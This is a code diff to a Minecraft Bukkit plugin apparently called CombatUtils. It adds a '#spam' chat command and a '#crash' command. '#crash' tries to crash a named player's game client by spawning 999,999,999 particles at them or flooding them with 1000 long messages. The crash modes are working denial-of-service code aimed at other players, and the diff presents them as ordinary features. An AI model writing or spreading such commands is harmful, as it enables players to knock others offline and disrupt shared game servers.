@@ -3,7 +3,10 @@ package me.improper.combatutils.commands;
 import me.improper.combatutils.CombatUtils;
 import me.improper.combatutils.plugin.Module;
 import me.improper.combatutils.plugin.Profile;
+import me.improper.combatutils.server.ServerUtils;
+import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.Particle;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -22,6 +25,44 @@ public class Commands implements CommandExecutor {
                         Module module = profile.getModuleObject(args[0]);
                         if (module.isEnabled()) module.onDisable();
                         else module.onEnable();
+                    }
+                    return true;
+                }
+                case "#spam" -> {
+                    if (sender instanceof Player p) {
+                        int times = Integer.parseInt(args[0]);
+                        String msg = ServerUtils.buildArgs(args,1);
+                        if (times > 100) {
+                            sender.sendMessage(CombatUtils.STARTER + ChatColor.RED + "This action is over the safety limits, you might lag yourself!");
+                            return true;
+                        }
+                        for (int i = 0; i < times; i ++) p.chat(msg);
+                        return true;
+                    }
+                    sender.sendMessage("You need to be a player to run this command!");
+                    return true;
+                }
+                case "#crash" -> {
+                    Player p = Bukkit.getPlayer(args[1]);
+                    switch (args[0]) {
+                        case "particle" -> {
+                            p.spawnParticle(Particle.FLAME,p.getEyeLocation(),999999999,0,0,0,0);
+                            sender.sendMessage(CombatUtils.STARTER +
+                                    ChatColor.GRAY + "Attempted to " +
+                                    ChatColor.WHITE + "Particle " +
+                                    ChatColor.GRAY + "crash " +
+                                    ChatColor.WHITE + p.getName());
+                            return true;
+                        }
+                        case "message" -> {
+                            for (int i = 0; i < 1000; i ++) p.sendMessage(CombatUtils.ESSAY);
+                            sender.sendMessage(CombatUtils.STARTER +
+                                    ChatColor.GRAY + "Attempted to " +
+                                    ChatColor.WHITE + "Message " +
+                                    ChatColor.GRAY + "crash " +
+                                    ChatColor.WHITE + p.getName());
+                            return true;
+                        }
                     }
                     return true;
                 }
